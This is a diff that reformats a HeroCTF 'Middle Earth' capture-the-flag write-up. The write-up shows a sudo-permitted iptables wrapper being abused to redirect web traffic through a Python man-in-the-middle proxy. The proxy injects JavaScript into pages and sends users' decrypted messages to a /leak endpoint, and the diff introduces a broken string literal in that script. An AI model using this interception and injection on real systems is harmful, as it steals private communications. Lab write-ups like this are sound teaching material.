@@ -1,119 +1,153 @@
 <style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>
 
-HeroCTF – Middle Earth (Web / Crypto / System) Writeup
+# HeroCTF 2023 – Middle Earth (Web / Crypto / System)
 
-Category: Web / Crypto / System
-Difficulty: Medium
-Flag: Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}
+**Category:** Web / Crypto / System  
+**Difficulty:** Medium  
+**Flag:** `Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}`  
 
-1. Challenge Overview
+---
+
+## 1. Challenge Description
 
 We’re given:
 
-A web app:
+- A web app:  
+  `http://dyn03.heroctf.fr:13892`
+- SSH access:  
+  ```bash
+  ssh -p 11657 aragorn@dyn03.heroctf.fr
+  # password: hobbit
+  ```
+- Flavour text about *“end-to-end encryption”* and asymmetric crypto.
+- Story detail: **Saruman** is using the app as **admin**.
+
+**Goal:**  
+Break the “secure” mail system and recover the flag `Hero{...}`.
+
+---
+
+## 2. First Look at the Web App
+
+Visiting:
+
+```text
 http://dyn03.heroctf.fr:13892
+```
 
-SSH access:
-ssh -p 11657 aragorn@dyn03.heroctf.fr (password: hobbit)
+Logging in with:
 
-Flavour text about “end-to-end encryption” and asymmetric crypto.
+```text
+Username: aragorn
+Password: hobbit
+```
 
-Note that Saruman is using the app as admin.
+We see a very simple inbox UI:
 
-Goal: break the “secure” mail system and recover the flag in the format Hero{...}.
+- A **Session Encryption Key** (an RSA public key in PEM format)
+- A button: **Request Encrypted Message**
+- A section displaying something like:
 
-2. First Look at the Web App
+> New Encrypted Message  
+> From: server@secure.mail  
+> `<ciphertext in base64>`  
+> `[Decrypt]`
 
-Browsing to http://dyn03.heroctf.fr:13892 and logging in with aragorn:hobbit shows a very simple inbox:
+When we click **Decrypt**, the ciphertext is decrypted **client-side** and replaced with a plaintext quote, for example:
 
-A Session Encryption Key (an RSA public key) shown in PEM format.
+> Only put off until tomorrow what you are willing to die having left undone. ~Pablo Picasso
 
-A button to Request Encrypted Message.
+### Key Observations
 
-A UI showing:
+- The app is served over **HTTP**, not HTTPS.
+- All crypto (key generation, encryption, decryption) is done in **JavaScript in the browser**.
+- The server only ever sees:
+  - The session **public** key
+  - Encrypted messages for that key
 
-New Encrypted Message
-From: server@secure.mail
+The flavour text heavily hints:
 
-<ciphertext in base64>
+> Bilbo thinks this is end-to-end encryption, but we have server access.
 
-[Decrypt]
+So instead of attacking RSA or the crypto directly, the vulnerability is **architectural**:
 
+> If the server can modify the JavaScript, it can break any “end-to-end” encryption implemented in that JavaScript.
 
-When we click “Decrypt”, the ciphertext is decrypted client-side and replaced with a plaintext quote, e.g.:
+Our job: leverage server-side access to undermine this so-called “end-to-end” encryption.
 
-Only put off until tomorrow what you are willing to die having left undone. ~Pablo Picasso
+---
 
-Key observations:
+## 3. Getting System Access as `aragorn`
 
-The app is over HTTP, not HTTPS.
+We’re given SSH access, so we log in:
 
-The cryptography (key generation, encryption, decryption) is all done in JavaScript in the browser.
-
-The server only sees:
-
-A session public key, and
-
-Encrypted messages for that key.
-
-The challenge text screams: “Bilbo thinks this is end-to-end encryption, but we have server access.”
-
-So instead of attacking RSA directly, the actual vulnerability is architectural:
-
-If the server can modify the JavaScript, it can break any “end-to-end” encryption implemented in that JavaScript.
-
-3. Getting System Access as aragorn
-
-We SSH into the box:
-
+```bash
 ssh -p 11657 aragorn@dyn03.heroctf.fr
 # password: hobbit
-
+```
 
 Basic recon:
 
+```bash
 whoami        # aragorn
 hostname      # middle_earth
 ls /
 ls /var
 ls /opt
 ls /home
+```
 
+We notice:
 
-We see a few interesting things:
+- `/challenge` exists but is not accessible:
 
-/challenge exists but is not accessible: cd /challenge → Permission denied.
+  ```bash
+  cd /challenge
+  # Permission denied
+  ```
 
-/opt contains a script:
+- `/opt` contains an interesting script:
 
-cd /opt
-ls -l
-# -rwxrwxr-x 1 root root 2426 Nov 27 11:03 w_iptables.sh
+  ```bash
+  cd /opt
+  ls -l
+  # -rwxrwxr-x 1 root root 2426 Nov 27 11:03 w_iptables.sh
+  ```
 
+Check `sudo` rights:
 
-Next, check our sudo rights:
-
+```bash
 sudo -l
+```
 
+Relevant output:
 
-Output (relevant part):
-
+```text
 User aragorn may run the following commands on middle_earth:
     (root) /opt/w_iptables.sh
+```
 
+So:
 
-So we can’t run arbitrary root commands, but we can run /opt/w_iptables.sh as root.
+- We **cannot** run arbitrary commands as root.
+- We **can** run `/opt/w_iptables.sh` as root with `sudo`.
 
-4. Understanding /opt/w_iptables.sh
+This will be our escalation vector.
 
-Let’s read it:
+---
 
+## 4. Understanding `/opt/w_iptables.sh`
+
+View the script:
+
+```bash
 cd /opt
 sed -n '1,160p' w_iptables.sh
+```
 
+Summarized content:
 
-Content (summarised):
-
+```bash
 #!/bin/bash
 
 APPEND_OR_DELETE=$1
@@ -128,7 +162,7 @@ ALLOWED_CHAINS=("INPUT" "OUTPUT" "FORWARD" "PREROUTING" "POSTROUTING")
 ALLOWED_PROTOCOLS=("tcp" "udp")
 ALLOWED_ACTIONS=("ACCEPT" "DROP" "REJECT" "MASQUERADE" "REDIRECT")
 
-# validates args...
+# ... validation logic ...
 
 if [[ "$ACTION" == "REDIRECT" ]]; then
     /usr/sbin/iptables -t nat -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION" --to-ports "$PORT_DST"
@@ -137,36 +171,51 @@ elif [[ "$ACTION" == "MASQUERADE" ]]; then
 else
     /usr/sbin/iptables -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION"
 fi
+```
 
+Constraints (from the validation):
 
-Key point: we have a controlled sudo that allows us to add/remove iptables rules, including NAT REDIRECT in the nat table, but only for ports 1–2000.
+- Only certain values allowed for:
+  - `APPEND_OR_DELETE` → `A` / `D`
+  - `CHAIN` → `INPUT` / `OUTPUT` / `FORWARD` / `PREROUTING` / `POSTROUTING`
+  - `PROTOCOL` → `tcp` / `udp`
+  - `ACTION` → `ACCEPT` / `DROP` / `REJECT` / `MASQUERADE` / `REDIRECT`
+- Ports must be within allowed range (1–2000).
 
-That’s enough to do a root-enabled network MITM.
+**Key insight:**
 
-5. Strategy: MITM + JS Injection
+We have a controlled `sudo` that lets us add/remove iptables rules, including **NAT REDIRECT** (`-t nat -j REDIRECT`) – but limited to low ports.
 
-We can’t edit /challenge as aragorn, so we can’t directly modify templates or server code.
+That is still enough for a **root-enabled network MITM**.
 
-But we can:
+---
 
-Run a small Python HTTP proxy (MITM) on a port we control, say 1337 (allowed by iptables wrapper).
+## 5. Strategy: MITM + JS Injection
 
-Use w_iptables.sh with REDIRECT to send all traffic destined to the real HTTP backend through our proxy.
+We **cannot** modify `/challenge` or the server-side templates directly as user `aragorn`.
 
-In the proxy, inject a <script> tag into HTML responses that:
+But we **can**:
 
-Watches the DOM.
+1. Run a small **Python HTTP proxy** (MITM) on a port we control, e.g. `1337` (within allowed range).
+2. Use `w_iptables.sh` with `REDIRECT` to route HTTP traffic destined to the backend through our proxy.
+3. In the proxy:
+   - Inject a `<script>` tag into HTML responses.
+   - The injected JS watches the DOM, and whenever decrypted plaintext appears:
+     - It exfiltrates it via a request like:  
+       `/leak?d=<base64-encoded or URL-encoded plaintext>`
+   - The proxy logs whatever is sent to `/leak`.
 
-When decrypted message text appears, it exfiltrates it back to the server via a simple request (e.g. /leak?d=...).
+Result:
 
-The proxy logs the value of d → we see whatever plaintext the user’s browser decrypted.
+- When **Saruman** (admin) decrypts his messages in the browser, his “end-to-end” decrypted plaintext (including the flag) will be exfiltrated and printed in our MITM logs.
 
-Since Saruman’s admin message presumably contains the flag, once his browser (or bot) decrypts it, we will see Hero{...} in our MITM output.
+---
 
-6. Building the Python MITM Proxy
+## 6. Building the Python MITM Proxy
 
-On the box, we create /tmp/mitm.py:
+Create the MITM script on the box:
 
+```bash
 cat << 'EOF' > /tmp/mitm.py
 import http.server, socketserver, http.client, urllib.parse, sys
 
@@ -178,10 +227,11 @@ INJECT_JS = '<script>(function(){function leak(t){if(!t)return;t=t.trim();if(!t)
 
 class Proxy(http.server.BaseHTTPRequestHandler):
     def log_message(self, fmt, *args):
-        sys.stderr.write("%s - - [%s] %s\n" %
+        sys.stderr.write("%s - - [%s] %s
+" %
                          (self.client_address[0],
                           self.log_date_time_string(),
-                          fmt%args))
+                          fmt % args))
 
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
@@ -260,93 +310,112 @@ def main():
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
-            print("\\n[!] Stopping MITM")
+            print("\n[!] Stopping MITM")
 
 if __name__ == "__main__":
     main()
 EOF
+```
 
+What this proxy does:
 
-This does:
+- Listens on `0.0.0.0:1337`
+- Proxies all HTTP requests to `127.0.0.1:80` (the internal backend)
+- For responses with:
+  - `Content-Type: text/html`
+  - A `</body>` tag
+- It injects our `INJECT_JS` before `</body>`.
+- It exposes `/leak?d=...`:
+  - Logs any `d` parameter as `[LEAK] <data>`
 
-Listens on 0.0.0.0:1337.
+---
 
-Forwards requests to 127.0.0.1:80.
+## 7. Redirecting HTTP Traffic via the Sudo Wrapper
 
-For responses with Content-Type: text/html and a </body>, injects our <script>.
+We now hook incoming HTTP traffic to our proxy.
 
-Handles /leak?d=... locally and prints [LEAK] <data> to stdout.
+Assumption: external traffic hits port `13892` → DNAT → internal port `80`.  
+We’ll insert ourselves into that flow using **NAT PREROUTING**:
 
-7. Redirecting HTTP Traffic via the Sudo Wrapper
-
-Now we use w_iptables.sh to redirect incoming HTTP destined to port 80 to our proxy 1337.
-
+```bash
 sudo /opt/w_iptables.sh A PREROUTING tcp 80 1337 REDIRECT
+```
 
+This effectively runs (as root):
 
-This runs as root and effectively does:
-
+```bash
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 1337
+```
 
+Now any HTTP request hitting port 80 is transparently rerouted to our MITM proxy on port 1337, which forwards it to the real backend.
 
-Given the external port is 13892, the infrastructure likely DNATs 13892 → 80 on the container/VM.
-We’re just inserting ourselves into that flow.
+---
 
-8. Running the MITM and Testing
+## 8. Running the MITM and Verifying
 
 Start the MITM:
 
+```bash
 python3 /tmp/mitm.py
+```
 
+Output:
 
-It prints:
-
+```text
 [*] MITM listening on port 1337
 [*] Proxying to 127.0.0.1:80
+```
 
+From your own machine, browse again to:
 
-From our local machine:
+```text
+http://dyn03.heroctf.fr:13892
+```
 
-Go to http://dyn03.heroctf.fr:13892.
+Login as `aragorn:hobbit`, then:
 
-Log in as aragorn:hobbit.
+1. Click **Request Encrypted Message**
+2. Click **Decrypt**
 
-Click Request Encrypted Message.
+On the server, in the `mitm.py` output, you should see something like:
 
-Click Decrypt.
-
-On the server, in the mitm.py output, we see something like:
-
+```text
 10.99.xx.xx - - [date] "POST /request_encrypted HTTP/1.1" 200 -
 [LEAK] New Encrypted Message
                         From: server@secure.mail
-                    
+
                     Decrypt
-                    
-                
+
                 cL8vUcV...
 [LEAK] Decrypted
 [LEAK] When you stop chasing the wrong things you give the right things a chance to catch you. ~Lolly Daskal
+```
 
+This confirms:
 
-That proves:
+- Our injected JS is executed in the victim’s browser.
+- It sees the decrypted plaintext in the DOM.
+- It calls `/leak?d=...`, which our MITM logs.
 
-Our injected JS runs in the victim’s browser.
+Exactly what we need for capturing Saruman’s admin messages.
 
-It sees the decrypted plaintext in the DOM.
+---
 
-It hits /leak?d=..., and the MITM logs it.
+## 9. Catching the Admin’s Flag
 
-Exactly what we need for Saruman.
+After some time (or when the admin/bot processes their messages), we eventually see a new leak in the proxy output:
 
-9. Catching the Admin’s Flag
-
-After some time (or manual actions from the admin/bot), we see another decrypted message in the MITM output:
-
+```text
 [LEAK] Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}
+```
 
+That matches the expected flag format.
 
-This is clearly in flag format, so:
+---
 
-Flag:
+## 10. Final Flag
+
+```text
 Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}
+```
+
